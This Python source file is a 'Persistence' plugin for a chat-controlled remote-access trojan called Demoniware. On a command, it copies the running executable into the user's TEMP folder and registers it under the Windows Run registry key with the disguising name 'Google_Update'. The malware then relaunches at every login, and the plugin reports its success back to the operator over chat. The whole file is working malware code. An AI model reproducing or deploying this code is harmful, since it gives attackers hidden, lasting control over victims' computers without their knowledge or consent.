from plugins import Plugin, Command

from threading import Thread

import os
import sys

try:
    import win32crypt
    from winreg import *
    win32_available = True
except:
    win32_available = False


class Main(Plugin):

    name = 'Persistence'
    version = '1.0.0'
    
    def setup(self):
        
        c = Command('/persistence', usage='HOSTNAME /persistence - make Demoniware persistent')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/persistence':
            arg_list = [chat_id]

            tempdir = os.environ.get('TEMP')
            fileName = os.path.basename(sys.executable)
            run = "Software\Microsoft\Windows\CurrentVersion\Run"

            arg_list += [tempdir, fileName, run]

            t = Thread(target=self.handle_persistence, args=tuple(arg_list))
            t.start()

    def handle_persistence(self, chat_id, tempdir, fileName, run):
        key = OpenKey(HKEY_CURRENT_USER, run)
        runkey = []
        try:
            i = 0
            while True:
                subkey = EnumValue(key, i)
                runkey.append(subkey[0])
                i += 1
        except WindowsError:
            pass


        if 'Google_Update' not in runkey:
            try:
                os.system('copy {} {}'.format(fileName, tempdir))
                fullpath = os.path.join(tempdir, fileName)
                key = OpenKey(HKEY_CURRENT_USER, run, 0, KEY_ALL_ACCESS)
                SetValueEx(key, 'Google_Update', 0, REG_SZ, fullpath)
                key.Close()
                self.send_message(chat_id, 'Persistence created!')
            except WindowsError as e:
                self.send_message(chat_id, 'Error creating register: {}'.format(str(e)))
        else:
            self.send_message(chat_id, 'Persistence register already created!')
